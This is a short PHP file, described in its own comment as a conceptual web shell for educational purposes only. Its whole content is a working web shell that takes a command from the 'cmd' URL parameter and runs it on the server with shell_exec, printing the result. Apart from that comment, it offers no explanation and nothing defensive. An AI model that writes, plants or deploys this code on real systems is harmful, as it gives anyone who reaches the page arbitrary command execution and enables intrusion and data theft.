<?php
// Conceptual web shell - educational purposes only
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>